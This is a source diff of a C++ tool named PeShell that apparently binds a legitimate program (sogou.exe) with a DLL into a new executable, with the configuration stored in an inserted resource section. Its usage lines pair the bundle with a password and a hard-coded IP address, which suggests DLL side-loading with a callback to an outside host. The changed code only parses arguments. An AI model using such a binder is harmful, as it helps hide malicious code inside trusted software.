@@ -36,9 +36,9 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 
 	if (argc < 3)
 	{
-		printf("example:PeShell -be sogou.exe sbiedll.dll -c params.dat -o out.exe\r\n");
+		printf("example:PeShell -be sogou.exe sbiedll.dll c:\\users -c params.dat -o out.exe\r\n");
 
-		printf("example:PeShell -be sogou.exe sbiedll.dll -p jy20200729 47.116.51.29 -o out.exe\r\n");
+		printf("example:PeShell -be sogou.exe sbiedll.dll c:\\users -p jy20200729 47.116.51.29 -o out.exe\r\n");
 
 		printf("example:PeShell -bd sogou.exe sbiedll.dll -c params.dat -o out.dll\r\n");
 
@@ -68,6 +68,8 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 
 	int cpu_arch = 0;
 
+	string outpath = "";
+
 	for (int i = 1; i < argc; )
 	{
 		if (lstrcmpiA(argv[i], "-be") == 0 || lstrcmpiA(argv[i], "-bd") == 0)
@@ -75,12 +77,16 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
 
 			type = BIND_RELEASE_EXE;
-			for (int j = i + 1, k = 0; k < 2; j++, k++)
+
+			int num = 2;
+			for (int j = i + 1, k = 0; k < num; j++, k++)
 			{
 				lstrcpyA(filelist[k], argv[j]);
 				paramscnt++;
 			}
-			i += 3;
+
+			outpath = argv[i + paramscnt + 1];
+			i += num + 2;
 			continue;
 		}
 		else if (lstrcmpiA(argv[i], "-boe") == 0 || lstrcmpiA(argv[i], "-bod") == 0)
@@ -88,12 +94,15 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 			cpu_arch = PEParser::getMachine((const char*)GetModuleHandleW(0));
 
 			type = BIND_RELEASE_EXE;
-			for (int j = i + 1, k = 0; k < 1; j++, k++)
+			int num = 1;
+			for (int j = i + 1, k = 0; k < num; j++, k++)
 			{
 				lstrcpyA(filelist[k], argv[j]);
 				paramscnt++;
 			}
-			i += 2;
+
+			outpath = argv[i + paramscnt + 1];
+			i += num + 2;
 			continue;
 		}
 		else if (lstrcmpiA(argv[i], "-dh") == 0 || lstrcmpiA(argv[i], "-eh") == 0)
@@ -177,7 +186,7 @@ int main(_In_ int argc, _In_reads_(argc) _Pre_z_ char** argv, _In_z_ char** envp
 	}
 	char secname[] = { '.','r','c','d','a','t','a',0 };
 
-	string resultfn = Section::insertSection(type, cpu_arch, secname, filelist, paramscnt, szoutFn);
+	string resultfn = Section::insertSection(type, cpu_arch, secname, filelist, paramscnt,outpath, szoutFn);
 	if (resultfn == "")
 	{
 		printf("something error happened\r\n");
